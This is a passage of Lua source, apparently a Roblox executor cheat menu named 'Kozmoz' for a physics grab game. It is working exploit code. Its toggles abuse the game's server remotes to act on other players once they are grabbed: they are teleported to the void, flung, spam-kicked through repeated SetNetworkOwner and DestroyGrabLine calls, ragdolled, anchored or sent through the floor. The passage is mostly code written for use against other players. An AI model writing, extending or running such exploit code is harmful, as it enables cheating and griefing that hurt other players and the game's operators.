    ["PoisonHole"] = Vector3.new(70.2, -68.1, 264.3),
    ["Mount Everest"] = Vector3.new(-421.9, 230.6, 526.2),
    ["Factory"] = Vector3.new(67.4, 346.2, 337.4),
    ["Prison"] = Vector3.new(592.1, 153.3, -104)
}

TPGrab = {
    Enabled = false,
    SelectedPos = "Void",
    Connection = nil,
    CurrentGrabbedPlayer = nil
}

local function GetGrabbedPlayer()
    grabParts = workspace:FindFirstChild("GrabParts")
    if not grabParts then return nil end
    grabPart = grabParts:FindFirstChild("GrabPart")
    if not grabPart then return nil end
    weld = grabPart:FindFirstChild("WeldConstraint")
    if not weld or not weld.Part1 then return nil end
    grabbedPart = weld.Part1
    model = grabbedPart:FindFirstAncestorWhichIsA("Model")
    if model then
        return Services.Players:GetPlayerFromCharacter(model)
    end
    return nil
end

local function TeleportPlayer(player, pos)
    if not player or not player.Character then return end
    root = player.Character:FindFirstChild("HumanoidRootPart")
    if root then
        pcall(function()
            GE = rs:FindFirstChild("GrabEvents")
            if GE then
                setOwner = GE:FindFirstChild("SetNetworkOwner")
                if setOwner then setOwner:FireServer(root, root.CFrame) end
                destroyLine = GE:FindFirstChild("DestroyGrabLine")
                if destroyLine then destroyLine:FireServer(root) end
            end
            root.CFrame = CFrame.new(pos)
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end)
    end
end

local function StartTPLoop()
    if TPGrab.Connection then TPGrab.Connection:Disconnect() end
    TPGrab.Connection = Services.RunService.Heartbeat:Connect(function()
        if not TPGrab.Enabled then return end
        grabbed = GetGrabbedPlayer()
        if grabbed and grabbed ~= Services.LocalPlayer then
            pos = TPPositions[TPGrab.SelectedPos]
            if pos then
                TeleportPlayer(grabbed, pos)
            end
        end
    end)
end

posList = {}
for name in pairs(TPPositions) do table.insert(posList, name) end
table.sort(posList)

GrabsLeftGroupbox:AddDropdown("TPPosition", {
    Text = "Select Position",
    Values = posList,
    Default = 1,
    Callback = function(Value)
        TPGrab.SelectedPos = Value
    end
})

GrabsLeftGroupbox:AddToggle("EnableTPGrab", {
    Text = "Enable TP Grab",
    Default = false,
    Callback = function(Value)
        TPGrab.Enabled = Value
        if Value then
            StartTPLoop()
        else
            if TPGrab.Connection then 
                TPGrab.Connection:Disconnect() 
                TPGrab.Connection = nil
            end
        end
    end
})

GrabsLeftGroupbox:AddDivider()
GrabsLeftGroupbox:AddLabel("Chaos Grab")

oldCleanup = getgenv().KozmozLoadingCleanup
getgenv().KozmozLoadingCleanup = function()
    if TPGrab.Connection then TPGrab.Connection:Disconnect() end
    if oldCleanup then oldCleanup() end
end

ChaosGrab = {
    Enabled = false,
    Connection = nil,
    ActiveChaos = {}
}

local function applyChaos(grabParts)
    chaosLoop = nil
    ragdolled = false
    chaosLoop = Services.RunService.Heartbeat:Connect(function()
        if not ChaosGrab.Enabled or not grabParts or not grabParts.Parent then
            if chaosLoop then chaosLoop:Disconnect() end
            return
        end
        grabPart = grabParts:FindFirstChild("GrabPart")
        if not grabPart then return end
        weld = grabPart:FindFirstChild("WeldConstraint")
        if not weld or not weld.Part1 then return end
        targetModel = weld.Part1.Parent
        if not targetModel then return end
        humanoid = targetModel:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        if targetModel == game.Players.LocalPlayer.Character then return end
        rootPart = targetModel:FindFirstChild("HumanoidRootPart") or weld.Part1
        if not rootPart then return end
        if not ragdolled then
            humanoid:ChangeState(Enum.HumanoidStateType.Physics)
            humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
            ragdolled = true
        end
        sidePower = 8000
        verticalPower = 100
        angPower = 200
        rootPart.AssemblyLinearVelocity = Vector3.new(
            math.random(-sidePower, sidePower),
            math.random(verticalPower, verticalPower + 50),
            math.random(-sidePower, sidePower)
        )
        rootPart.AssemblyAngularVelocity = Vector3.new(
            math.random(-angPower, angPower),
            math.random(-angPower, angPower),
            math.random(-angPower, angPower)
        )
    end)
    ChaosGrab.ActiveChaos[grabParts] = chaosLoop
end

local function toggleChaos(value)
    ChaosGrab.Enabled = value
    if ChaosGrab.Enabled then
        if ChaosGrab.Connection then return end
        ChaosGrab.Connection = Workspace.ChildAdded:Connect(function(child)
            if child.Name ~= "GrabParts" then return end
            task.spawn(function() applyChaos(child) end)
        end)
    else
        if ChaosGrab.Connection then ChaosGrab.Connection:Disconnect() ChaosGrab.Connection = nil end
        for grabParts, loop in pairs(ChaosGrab.ActiveChaos) do if loop then loop:Disconnect() end end
        ChaosGrab.ActiveChaos = {}
    end
end

GrabsLeftGroupbox:AddToggle("ChaosGrab", {
    Text = "Chaos Grab",
    Default = false,
    Callback = toggleChaos
})

GrabsLeftGroupbox:AddDivider()

KickGrab = {
    Enabled = false,
    Connection = nil,
    RunService = game:GetService("RunService")
}

grabEvents = game:GetService("ReplicatedStorage"):FindFirstChild("GrabEvents")
if grabEvents then
    KickGrab.SetNetworkOwner = grabEvents:FindFirstChild("SetNetworkOwner")
    KickGrab.DestroyLine = grabEvents:FindFirstChild("DestroyGrabLine")
end

GrabsLeftGroupbox:AddLabel("Kick Grab")

GrabsLeftGroupbox:AddToggle("KickGrab", {
    Text = "Kick Grab",
    Default = false,
    Callback = function(v)
        if v then
            cons["KickGrab"] = workspace.ChildAdded:Connect(function(c)
                if c.Name ~= "GrabParts" then return end
                GrabPart = c:WaitForChild("GrabPart", 0.1)
                task.wait(0.1)
                part = GrabPart.WeldConstraint.Part1
                if game.Players:FindFirstChild(part.Parent.Name) then
                    while c and c.Parent do
                        KickGrab.DestroyLine:FireServer(part)
                        KickGrab.RunService.RenderStepped:Wait()
                        KickGrab.SetNetworkOwner:FireServer(part, part.CFrame)
                        KickGrab.RunService.RenderStepped:Wait()
                        KickGrab.DestroyLine:FireServer(part)
                        KickGrab.RunService.RenderStepped:Wait()
                        KickGrab.SetNetworkOwner:FireServer(part, part.CFrame)
                        KickGrab.RunService.RenderStepped:Wait()
                        KickGrab.DestroyLine:FireServer(part)
                        KickGrab.RunService.RenderStepped:Wait()
                        KickGrab.SetNetworkOwner:FireServer(part, part.CFrame)
                        KickGrab.RunService.RenderStepped:Wait()
                        KickGrab.DestroyLine:FireServer(part)
                        KickGrab.RunService.RenderStepped:Wait()
                        KickGrab.SetNetworkOwner:FireServer(part, part.CFrame)
                    end
                end
            end)
        else
            if cons["KickGrab"] then cons["KickGrab"]:Disconnect() cons["KickGrab"] = nil end
        end
    end
})

NoclipGrab = {
    Enabled = false,
    Connection = nil,
    Loop = nil
}

GrabsRightGroupbox:AddLabel("Noclip Grab")
GrabsRightGroupbox:AddToggle("NoclipGrabRagdoll", {
    Text = "Noclip Grab",
    Default = false,
    Callback = function(value)
        NoclipGrab.Enabled = value
        if NoclipGrab.Enabled then
            if NoclipGrab.Connection then return end
            NoclipGrab.Connection = Workspace.ChildAdded:Connect(function(child)
                if child.Name ~= "GrabParts" then return end
                task.spawn(function()
                    grabPart = child:WaitForChild("GrabPart", 2)
                    if not grabPart then return end
                    weld = grabPart:WaitForChild("WeldConstraint", 2)
                    if not weld or not weld.Part1 then return end
                    grabbedPart = weld.Part1
                    playerChar = game.Players.LocalPlayer.Character
                    if playerChar and grabbedPart:IsDescendantOf(playerChar) then return end
                    targetModel = grabbedPart:FindFirstAncestorWhichIsA("Model")
                    if not targetModel or targetModel == playerChar then return end
                    humanoid = targetModel:FindFirstChildOfClass("Humanoid")
                    rootPart = targetModel:FindFirstChild("HumanoidRootPart") or grabPart
                    if not humanoid or not rootPart then return end
                    originalCollision = {}
                    for _, part in ipairs(targetModel:GetDescendants()) do
                        if part:IsA("BasePart") then originalCollision[part] = part.CanCollide end
                    end
                    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
                    NoclipGrab.Loop = Services.RunService.Heartbeat:Connect(function()
                        if not NoclipGrab.Enabled or not child.Parent then return end
                        for _, part in ipairs(targetModel:GetDescendants()) do
                            if part:IsA("BasePart") then part.CanCollide = false end
                        end
                    end)
                    child.AncestryChanged:Connect(function(_, newParent)
                        if not newParent then
                            if NoclipGrab.Loop then NoclipGrab.Loop:Disconnect() NoclipGrab.Loop = nil end
                            task.delay(1.5, function()
                                for part, old in pairs(originalCollision) do
                                    if part and part.Parent then part.CanCollide = old end
                                end
                                if humanoid and humanoid.Parent then
                                    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
                                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                                end
                            end)
                        end
                    end)
                end)
            end)
        else
            if NoclipGrab.Connection then NoclipGrab.Connection:Disconnect() NoclipGrab.Connection = nil end
            if NoclipGrab.Loop then NoclipGrab.Loop:Disconnect() NoclipGrab.Loop = nil end
        end
    end
})

GrabsRightGroupbox:AddDivider()

RagdollGrab = {
    Active = false,
    Connection = nil,
    RagdollToy = nil
}

local function SpawnAndWaitToy(toyName, cframe, mode)
    plr = Services.LocalPlayer
    inv = Services.Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
    while plr:FindFirstChild("InPlot") and plr.InPlot.Value and 
          not (plr:FindFirstChild("InOwnedPlot") and plr.InOwnedPlot.Value) and 
          not (plr:FindFirstChild("CanSpawnToy") and plr.CanSpawnToy.Value) do
        task.wait()
    end
    spawnRemote = Services.rs:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction")
    if typeof(mode) == "string" and string.lower(mode) == "headup" then
        task.spawn(function()
            pcall(function()
                spawnRemote:InvokeServer(
                    toyName,
                    CFrame.new(cframe.Position + Vector3.new(0, 1, 0), cframe.Position) * CFrame.Angles(math.pi, 0, 0),
                    Vector3.new(0, 0, 0)
                )
            end)
        end)
    else
        task.spawn(function()
            pcall(function()
                spawnRemote:InvokeServer(toyName, cframe, Vector3.new(0, 0, 0))
            end)
        end)
    end
    if not inv then
        inv = Services.Workspace:WaitForChild(plr.Name .. "SpawnedInToys", 3)
    end
    if inv then
        toy = inv:WaitForChild(toyName, 3)
        return toy
    end
    return nil
end

local function SetNetworkOwner(part)
    setOwner = Services.rs:WaitForChild("GrabEvents"):WaitForChild("SetNetworkOwner")
    pcall(function()
        setOwner:FireServer(part, part.CFrame)
    end)
end

GrabsRightGroupbox:AddLabel("Ragdoll Grab")

GrabsRightGroupbox:AddToggle("RagdollGrab", {
    Text = "Ragdoll Grab",
    Default = false,
    Callback = function(v421)
        RagdollGrab = v421
        if RagdollGrab then
            plr = Services.Players.LocalPlayer
            spawnedToys = Services.Workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
            if not spawnedToys:FindFirstChild("Ragdoll") then
                head = plr.Character:WaitForChild("Head")
                headup = CFrame.new(head.Position + Vector3.new(0, 1, 0), head.Position) * CFrame.Angles(math.pi, 0, 0)
                Services.SpawnToy:InvokeServer("PalletLightBrown", headup, Vector3.new(0, 0, 0))
                v1150 = nil
                startTime = tick()
                repeat
                    for _, toy in pairs(spawnedToys:GetChildren()) do
                        if toy.Name == "PalletLightBrown" and toy:FindFirstChild("SoundPart") then
                            v1150 = toy
                            break
                        end
                    end
                    task.wait()
                until v1150 or (tick() - startTime > 5)
                if not v1150 then
                    print("[RagdollGrab] Failed to find spawned pallet")
                    return
                end
                v1151 = v1150.SoundPart
                while (not v1151:FindFirstChild("PartOwner")) or (v1151:FindFirstChild("PartOwner") and (v1151.PartOwner.Value ~= plr.Name)) do
                    task.spawn(function()
                        Services.SetNetOwner:FireServer(v1151, v1151.CFrame)
                    end)
                    task.wait()
                end
                v1152 = Instance.new("BodyVelocity")
                v1152.Parent = v1151
                v1152.MaxForce = Vector3.new(0, math.huge, 0)
                v1152.Velocity = Vector3.new(0, 1000, 0)
                for _, v1308 in pairs(v1150:GetChildren()) do
                    if v1308:IsA("BasePart") then
                        v1308.Transparency = 1
                        v1308.Size = Vector3.new(0.5, 0.5, 0.5)
                    end
                end
                if v1151:FindFirstChild("Wood") then
                    v1151.Wood:Destroy()
                end
                v1150.Name = "Ragdoll"
                inv.ragdoll = v1150
            end
            cons["rgarab1"] = Services.Workspace.ChildAdded:Connect(function(v932)
                if v932.Name == "GrabParts" then
                    v1486 = v932.GrabPart.WeldConstraint.Part1
                    v1487 = v1486.Parent:FindFirstChild("HumanoidRootPart")
                    if v1487 then
                        ragdoll = spawnedToys:FindFirstChild("Ragdoll")
                        if ragdoll then
                            firetouchinterest(ragdoll.SoundPart, v1486.Parent.Head, 0)
                        end
                    end
                end
            end)
        else
            if cons["rgarab1"] then 
                cons["rgarab1"]:Disconnect() 
                cons["rgarab1"] = nil
            end
            if inv.ragdoll then 
                Services.DestroyToy:FireServer(inv.ragdoll) 
                inv.ragdoll = nil
            end
        end
    end
})
GrabsRightGroupbox:AddDivider()

GravityGrab = {
    Scale = 0,
    Connection = nil,
    ZeroG = {}
}

local function updateForce(root)
    data = GravityGrab.ZeroG[root]
    if not data or not root then return end
    data.force.Force = Vector3.new(0, root.AssemblyMass * workspace.Gravity * (1 - GravityGrab.Scale), 0)
end

local function applyGravityControl(part)
    root = part.AssemblyRootPart or part
    if not root or GravityGrab.ZeroG[root] then return end
    att = Instance.new("Attachment")
    att.Name = "Gravity_Att"
    att.Parent = root
    force = Instance.new("VectorForce")
    force.Name = "Gravity_Force"
    force.Attachment0 = att
    force.RelativeTo = Enum.ActuatorRelativeTo.World
    force.ApplyAtCenterOfMass = true
    force.Parent = root
    GravityGrab.ZeroG[root] = { force = force, att = att }
    updateForce(root)
end

local function restoreGravity()
    for _, data in pairs(GravityGrab.ZeroG) do
        if data.force then data.force:Destroy() end
        if data.att then data.att:Destroy() end
    end
    GravityGrab.ZeroG = {}
end

GrabsRightGroupbox:AddLabel("Gravity Grab")
GrabsRightGroupbox:AddToggle("GravityGrab", {
    Text = "Gravity Grab",
    Default = false,
    Callback = function(value)
        if value then
            GravityGrab.Connection = Workspace.ChildAdded:Connect(function(child)
                if child.Name ~= "GrabParts" then return end
                grabPart = child:WaitForChild("GrabPart", 2)
                if not grabPart then return end
                weld = grabPart:FindFirstChildOfClass("WeldConstraint")
                if not weld or not weld.Part1 then return end
                grabbedPart = weld.Part1
                char = game.Players.LocalPlayer.Character
                if char and grabbedPart:IsDescendantOf(char) then return end
                applyGravityControl(grabbedPart)
            end)
        else
            if GravityGrab.Connection then GravityGrab.Connection:Disconnect() GravityGrab.Connection = nil end
            restoreGravity()
        end
    end
})

GrabsRightGroupbox:AddSlider("GravityWeight", {
    Text = "Gravity Weight",
    Default = 0,
    Min = 0,
    Max = 5,
    Decimals = 0,
    Callback = function(value)
        GravityGrab.Scale = value
        for root in pairs(GravityGrab.ZeroG) do updateForce(root) end
    end
})

GrabsRightGroupbox:AddDivider()

AnchorGrab = {
    Enabled = false,
    Delay = 0.04,
    Force = 55000,
    Damping = 4500,
    Connection = nil,
    Anchors = {}
}

local function removeAnchor(rootPart)
    if not rootPart or not rootPart.Parent then return end
    for _, child in ipairs(rootPart:GetChildren()) do
        if (child:IsA("BodyPosition") or child:IsA("BodyGyro")) and
           (child.Name == "InstantAnchorBP" or child.Name == "InstantAnchorBG") then
            child:Destroy()
        end
    end
    AnchorGrab.Anchors[rootPart] = nil
end

local function applyInstantAnchor(rootPart)
    if not rootPart or not rootPart.Parent then return end
    removeAnchor(rootPart)
    bp = Instance.new("BodyPosition")
    bp.Name = "InstantAnchorBP"
    bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bp.P = AnchorGrab.Force
    bp.D = AnchorGrab.Damping
    bp.Position = rootPart.Position
    bp.Parent = rootPart
    bg = Instance.new("BodyGyro")
    bg.Name = "InstantAnchorBG"
    bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bg.P = AnchorGrab.Force
    bg.D = AnchorGrab.Damping
    bg.CFrame = rootPart.CFrame
    bg.Parent = rootPart
    AnchorGrab.Anchors[rootPart] = {bp = bp, bg = bg}
end

local function onGrabCreated(grabModel)
    if grabModel.Name ~= "GrabParts" then return end
    task.spawn(function()
        grabPart = grabModel:WaitForChild("GrabPart",1)
        if not grabPart then return end
        weld = grabPart:FindFirstChild("WeldConstraint")
        if not weld or not weld.Part1 then return end
        grabbedPart = weld.Part1
        targetModel = grabbedPart:FindFirstAncestorWhichIsA("Model") or grabbedPart
        if targetModel == game.Players.LocalPlayer.Character then return end
        rootPart = targetModel:FindFirstChild("HumanoidRootPart") or targetModel.PrimaryPart or grabbedPart
        if not rootPart or not rootPart:IsA("BasePart") then return end
        if AnchorGrab.Enabled then removeAnchor(rootPart) end
        local releaseConnection
        releaseConnection = grabModel.AncestryChanged:Connect(function(_, newParent)
            if newParent == nil then
                releaseConnection:Disconnect()
                task.delay(AnchorGrab.Delay,function()
                    if rootPart.Parent and AnchorGrab.Enabled then
                        applyInstantAnchor(rootPart)
                    end
                end)
            end
        end)
    end)
end

local function enableInstantAnchor()
    if AnchorGrab.Connection then return end
    AnchorGrab.Connection = Workspace.ChildAdded:Connect(onGrabCreated)
end

local function disableInstantAnchor()
    if AnchorGrab.Connection then
        AnchorGrab.Connection:Disconnect()
        AnchorGrab.Connection = nil
    end
end

local function unanchorAll()
    for rootPart,_ in pairs(AnchorGrab.Anchors) do removeAnchor(rootPart) end
    AnchorGrab.Anchors = {}
end

GrabsRightGroupbox:AddLabel("Anchor Grab")
GrabsRightGroupbox:AddToggle("InstantAnchorGrab", {
    Text = "Anchor Grab",
    Default = false,
    Callback = function(Value)
        AnchorGrab.Enabled = Value
        if Value then
            enableInstantAnchor()
        else
            disableInstantAnchor()
        end
    end
})

GrabsRightGroupbox:AddButton({
    Text = "Unanchor All",
    Func = function()
        unanchorAll()
    end
})

GrabsRightGroupbox:AddDivider()

MassLessGrab = {
    Enabled = false,
    Connection = nil,
    Sense = 200
}

GrabsRightGroupbox:AddLabel("Massless Grab")
GrabsRightGroupbox:AddToggle("MassLessGrabToggle", {
    Text = "MassLess Grab",
    Default = false,
    Callback = function(Value)
        MassLessGrab.Enabled = Value
        if not MassLessGrab.Enabled then
            if MassLessGrab.Connection then
                MassLessGrab.Connection:Disconnect()
                MassLessGrab.Connection = nil
            end
            return
        end
        if MassLessGrab.Connection then
            MassLessGrab.Connection:Disconnect()
            MassLessGrab.Connection = nil
        end
        MassLessGrab.Connection = game:GetService("RunService").Heartbeat:Connect(function()
            if not MassLessGrab.Enabled then
                return
            end
            gp = workspace:FindFirstChild("GrabParts")
            if not gp then
                return
            end
            dp = gp:FindFirstChild("DragPart")
            if not dp then
                return
            end
            ap = dp:FindFirstChild("AlignPosition")
            ao = dp:FindFirstChild("AlignOrientation")
            if ap then
                ap.Responsiveness = MassLessGrab.Sense
                ap.MaxForce = math.huge
                ap.MaxVelocity = math.huge
            end
            if ao then
                ao.Responsiveness = MassLessGrab.Sense
                ao.MaxTorque = math.huge
            end
        end)
    end
})

GrabsRightGroupbox:AddDivider()

SkyGrab = {
    Active = false,
    Strength = 500,
    Connection = nil
}

GrabsRightGroupbox:AddLabel("Sky Grab")
GrabsRightGroupbox:AddToggle("SkyGrabToggle", {
    Text = "Sky Grab",
    Default = false,
    Callback = function(value)
        SkyGrab.Active = value
        if value then
            SkyGrab.Connection = Workspace.ChildAdded:Connect(function(child)
                if child.Name == "GrabParts" and SkyGrab.Active then
                    task.wait(0.15)
                    grabPart = child:FindFirstChild("GrabPart")
                    if grabPart then
                        weld = grabPart:FindFirstChild("WeldConstraint")
                        if weld and weld.Part1 then
                            grabbedPart = weld.Part1
                            myChar = game.Players.LocalPlayer.Character
                            if myChar and grabbedPart:IsDescendantOf(myChar) then return end
                            targetModel = grabbedPart.Parent
                            while targetModel and not targetModel:FindFirstChildOfClass("Humanoid") do
                                targetModel = targetModel.Parent
                            end
                            if targetModel then
                                humanoid = targetModel:FindFirstChildOfClass("Humanoid")
                                rootPart = targetModel:FindFirstChild("HumanoidRootPart") or grabbedPart
                                if humanoid and rootPart then
                                    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                                    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
                                    bv = Instance.new("BodyVelocity")
                                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                    bv.Velocity = Vector3.new(0, SkyGrab.Strength, 0)
                                    bv.Parent = rootPart
                                    task.delay(2, function() pcall(function() bv:Destroy() end) end)
                                end
                            end
                        end
                    end
                end
            end)
        else
            if SkyGrab.Connection then
                SkyGrab.Connection:Disconnect()
                SkyGrab.Connection = nil
            end
        end
    end
})

GrabsRightGroupbox:AddSlider("SkyGrabStrength", {
    Text = "Sky Grab Strength",
    Default = 500,
    Min = 100,
    Max = 2000,
    Decimals = 0,
    Callback = function(value)
        SkyGrab.Strength = value
    end
})

GrabsRightGroupbox:AddDivider()

HellGrab = {
    Active = false,
    Connection = nil
}

local function applyHellGrab(grabbedPart)
    if not grabbedPart then return end
    targetModel = grabbedPart.Parent
    while targetModel and not targetModel:FindFirstChildOfClass("Humanoid") do
        targetModel = targetModel.Parent
    end
    if not targetModel then return end
    humanoid = targetModel:FindFirstChildOfClass("Humanoid")
    rootPart = targetModel:FindFirstChild("HumanoidRootPart") or grabbedPart
    if not humanoid or not rootPart then return end
    originalDestroyHeight = workspace.FallenPartsDestroyHeight
    workspace.FallenPartsDestroyHeight = -1000
    humanoid:ChangeState(Enum.HumanoidStateType.Physics)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing, false)
    humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
    for _, part in pairs(targetModel:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = false
            part.CanQuery = false
            part.CanTouch = false
        end
    end
    bodyVel = Instance.new("BodyVelocity")
    bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVel.Velocity = Vector3.new(0, -100, 0)
    bodyVel.Parent = rootPart
    bodyPos = Instance.new("BodyPosition")
    bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyPos.Position = Vector3.new(rootPart.Position.X, -1000, rootPart.Position.Z)
    bodyPos.Parent = rootPart
    bodyAngular = Instance.new("BodyAngularVelocity")
    bodyAngular.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bodyAngular.AngularVelocity = Vector3.new(30, 20, 40)
    bodyAngular.Parent = rootPart
    task.delay(2, function()
        pcall(function() bodyVel:Destroy() end)
        pcall(function() bodyPos:Destroy() end)
        pcall(function() bodyAngular:Destroy() end)
        workspace.FallenPartsDestroyHeight = originalDestroyHeight
        if targetModel and targetModel.Parent then
            for _, part in pairs(targetModel:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                    part.CanQuery = true
                    part.CanTouch = true
                end
            end
            if humanoid then
                humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
                humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
            end
        end
    end)
    print("[Hell Grab] Sent through floor: " .. (targetModel.Name or "Unknown"))
end

GrabsRightGroupbox:AddLabel("Hell Grab")
GrabsRightGroupbox:AddToggle("HellGrabToggle", {
    Text = "Hell Grab",
    Default = false,
    Callback = function(value)
        HellGrab.Active = value
        if value then
            if HellGrab.Connection then return end
            HellGrab.Connection = Workspace.ChildAdded:Connect(function(child)
                if child.Name == "GrabParts" and HellGrab.Active then
                    task.wait(0.15)
                    grabPart = child:FindFirstChild("GrabPart")
                    if grabPart then
                        weld = grabPart:FindFirstChild("WeldConstraint")
                        if weld and weld.Part1 then
                            grabbedPart = weld.Part1
                            myChar = game.Players.LocalPlayer.Character
                            if myChar and grabbedPart:IsDescendantOf(myChar) then
                                return
                            end
                            applyHellGrab(grabbedPart)
                        end
                    end
                end
            end)
        else
            if HellGrab.Connection then
                HellGrab.Connection:Disconnect()
                HellGrab.Connection = nil
            end
        end
    end
})

KozmozLoadingCleanup = function()
    if Fling.Connection then pcall(function() Fling.Connection:Disconnect() end) end
    if Spin.Connection then pcall(function() Spin.Connection:Disconnect() end) end
    if KillGrab.Connection then pcall(function() KillGrab.Connection:Disconnect() end) end
    if ChaosGrab.Connection then pcall(function() ChaosGrab.Connection:Disconnect() end) end
    if KickGrab.Connection then pcall(function() KickGrab.Connection:Disconnect() end) end
    if NoclipGrab.Connection then pcall(function() NoclipGrab.Connection:Disconnect() end) end
    if RagdollGrab.Connection then pcall(function() RagdollGrab.Connection:Disconnect() end) end
    if GravityGrab.Connection then pcall(function() GravityGrab.Connection:Disconnect() end) end
    if AnchorGrab.Connection then pcall(function() AnchorGrab.Connection:Disconnect() end) end
    if MassLessGrab.Connection then pcall(function() MassLessGrab.Connection:Disconnect() end) end
    if SkyGrab.Connection then pcall(function() SkyGrab.Connection:Disconnect() end) end
    if HellGrab.Connection then pcall(function() HellGrab.Connection:Disconnect() end) end
    restoreGravity()
    unanchorAll()
end

functions = {
    DestroyToy = Services.rs.MenuToys.DestroyToy,
    SetNetOwner = Services.rs.GrabEvents.SetNetworkOwner,
    CreateLine = Services.rs.GrabEvents.CreateGrabLine,
    DestroyLine = Services.rs.GrabEvents.DestroyGrabLine,
    SpawnToy = Services.rs.MenuToys.SpawnToyRemoteFunction,
    Struggle = Services.rs.CharacterEvents.Struggle,
    Ragdoll = Services.rs.CharacterEvents.RagdollRemote,
    StopVel = Services.rs.GameCorrectionEvents.StopAllVelocity,
    StickyEvent = Services.rs.PlayerEvents.StickyPartEvent
}

inv = getInv()
plr = Services.LocalPlayer

function sno(obj)
    functions.SetNetOwner:FireServer(obj, obj.CFrame)
end

function stvel(hrp)
    hrp.AssemblyLinearVelocity = Vector3.zero
    hrp.AssemblyAngularVelocity = Vector3.zero
end

function getplot()
    for i = 1, 5 do
        plot = Workspace.Plots:FindFirstChild("Plot"..i)
        value = plot and plot.PlotSign and plot.PlotSign.ThisPlotsOwners and plot.PlotSign.ThisPlotsOwners:FindFirstChild("Value")
        if plot and value and value.Value and value.Value:find(plr.Name) then
            return plot
        end
    end
end

function spawntoy(toy, cf)
    local me = Services.LocalPlayer
    if not me then return nil end
    if not me.CanSpawnToy.Value then
        me.CanSpawnToy.Changed:Wait()
    end
    local currentInv = getInv()
    if not currentInv then return nil end
    local t
    local toyadded
    toyadded = currentInv.ChildAdded:Connect(function(c)
        if c.Name == toy then
            t = c
            toyadded:Disconnect()
        end
    end)
    task.spawn(function()
        functions.SpawnToy:InvokeServer(toy, cf, Vector3.new(0,0,0))
    end)
    local time = tick() + 1
    repeat task.wait() until t or tick() > time
    if t then
        return t
    else
        local plot = getplot()
        if plot then
            return Workspace.PlotItems[plot.Name]:FindFirstChild(toy) or Workspace.PlotItems[plot.Name]:WaitForChild(toy, 0.5)
        end
    end
end

function grab(obj)
    if Services.rs.CharacterEvents.Grab then
        Services.rs.CharacterEvents.Grab:InvokeServer(obj, plr.Character)
    end
end

function drop(obj, cf)
    if Services.rs.CharacterEvents.Drop then
        Services.rs.CharacterEvents.Drop:InvokeServer(obj, cf, Vector3.new(0, 0, 0))
    end
end

Lines = 0
lagger = nil
Workspace.DescendantAdded:Connect(function(d)
    if d.Name == "GrabBeam" then
        Lines += 1
        lagger = d.Parent.Parent.Parent
    end
end)

ToyList = {
	["Coconut"]     = "FoodCoconut",
	["Banana"]      = "FoodBanana",
	["Fries"]       = "FoodFrenchFries",
	["MeatStick"]   = "FoodMeatStick",
	["Poop"]        = "PoopPile",
	["Donut"]       = "FoodDonut",
	["Cake"]        = "FoodCakePink",
	["Burger"]      = "FoodHamburger",
	["Pizza"]       = "FoodPizzaCheese",
	["Hotdog"]      = "FoodHotdog",
	["Mushroom"]    = "FoodMushroomPoison",
	["Banjo"]       = "InstrumentGuitarBanjo",
	["Violin"]      = "InstrumentGuitarViolin",
	["Ukulele"]     = "InstrumentGuitarUkulele",
	["Sax"]         = "InstrumentWoodwindSaxophone",
	["Vuvuzela"]    = "InstrumentBrassVuvuzela",
	["Bongos"]      = "InstrumentDrumBongos",
	["Mic"]         = "InstrumentVoiceMicrophone",
	["Pepperoni"]   = "FoodPizzaPepperoni",
	["Piano"]       = "InstrumentPianoMelodica",
	["Bread"]       = "FoodBread",
	["Egg"]         = "FoodDippyEgg",
	["Mayo"]        = "FoodMayonnaise",
	["WhiteMug"]    = "CupMugWhite",
	["Ocarina"]     = "InstrumentWoodwindOcarina",
	["SparklePoop"] = "PoopPileSparkle",
	["BrownMug"]    = "CupMugBrown",
	["Trumpet"]     = "InstrumentBrassTrumpet",
	["Snare"]       = "InstrumentDrumSnare",
	["Lyre"]        = "InstrumentGuitarLyre",
}

toyDropdownValues = {}
for name, _ in pairs(ToyList) do
	table.insert(toyDropdownValues, name)
end
table.sort(toyDropdownValues)

SelectedFood = ToyList["Burger"] or ToyList[toyDropdownValues[1]]

function getKeyCodeFromString(keyString)
    upperKey = string.upper(keyString)
    for _, keyCode in pairs(Enum.KeyCode:GetEnumItems()) do
        if keyCode.Name == upperKey then
            return keyCode
        end
    end
    return Enum.KeyCode.J
end

ThirdPartyLeft = Tabs.DefenseTab:AddRightGroupbox("Classic Defense")

ThirdPartyTarget = nil
ThirdPartyActive = false
ThirdPartyAntiKickActive = false
ThirdPartyAntiGrabActive = false
ThirdPartyAntiKickItemActive = false
ThirdPartyTargetList = {}
ThirdPartySelectedToy = "ClockAlarm"
ThirdPartyPCLDList = {}
ThirdPartyPCLDConns = {}
ThirdPartyShurikens = {}
ThirdPartyReturnPoses = {}

RS = game:GetService("ReplicatedStorage")
RunService = game:GetService("RunService")

getname = function(str)
    return str:match("%(([^)]+)%)") or str
end

GetPlayerList = function()
    list = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= plr then
            table.insert(list, p.DisplayName.." ("..p.Name..")")
        end
    end
    return list
end

